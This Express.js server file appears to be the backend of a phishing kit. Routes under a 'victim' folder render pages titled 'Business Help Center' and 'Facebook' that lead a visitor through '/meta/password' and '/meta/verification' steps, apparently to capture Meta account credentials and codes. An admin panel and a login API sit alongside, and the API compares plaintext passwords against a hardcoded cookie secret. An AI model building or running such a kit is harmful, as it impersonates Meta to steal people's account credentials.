import cookieParser from 'cookie-parser';
import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import Database from './modules/database.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const db = new Database();

const app = express();
const port = 3000;
const hostName = '0.0.0.0';

app.set('views', path.join(__dirname, 'public'));
app.set('view engine', 'ejs');

app.use((req, res, next) => {
    if (req.path.endsWith('.ejs')) {
        return res.status(403).send('<div style="font-size: 36px; text-align: center; margin-top: 20%; font-weight: bold; color: red;">LÀM GÌ THẾ EM???</div>');
    }
    next();
});

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser('con-meo-bu'));

app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({
            success: false,
            message: 'Vui lòng nhập tên đăng nhập và mật khẩu'
        });
    }

    try {
        const user = await db.getUserByUsername(username);

        if (!user) {
            return res.status(401).json({
                success: false,
                message: 'Tài khoản không tồn tại'
            });
        }

        if (user.password !== password) {
            return res.status(401).json({
                success: false,
                message: 'Mật khẩu không chính xác'
            });
        }

        const { password: _, ...userInfo } = user;

        res.cookie('user', JSON.stringify(userInfo), {
            signed: true,
            maxAge: 24 * 60 * 60 * 1000
        });

        return res.status(200).json({
            success: true,
            user: userInfo,
            message: 'Đăng nhập thành công'
        });
    } catch {
        return res.status(500).json({
            success: false,
            message: 'Lỗi server'
        });
    }
});

app.get('/', (req, res) => {
    res.render('victim/index', { title: 'Business Help Center' });
});
app.get('/meta', (req, res) => {
    res.render('victim/meta', { title: 'Business Help Center', nextPageUrl: '/meta/page-issues' });
});
app.get('/meta/page-issues', (req, res) => {
    res.render('victim/meta-page-issues', { title: 'Business Help Center', nextPageUrl: '/meta/password' });
});
app.get('/meta/password', (req, res) => {
    res.render('victim/meta-password', { title: 'Facebook', nextPageUrl: '/meta/verification' });
});
app.get('/meta/verification', (req, res) => {
    res.render('victim/meta-verification', { title: 'Facebook' });
});

app.get('/admin', (req, res) => {
    res.render('admin/index', { title: 'Admin' });
});
app.get('/admin/login', (req, res) => {
    res.render('admin/login', { title: 'Admin' });
});
app.listen(port, hostName, () => {
    console.log(`server listening on http://localhost:${port}`);
});
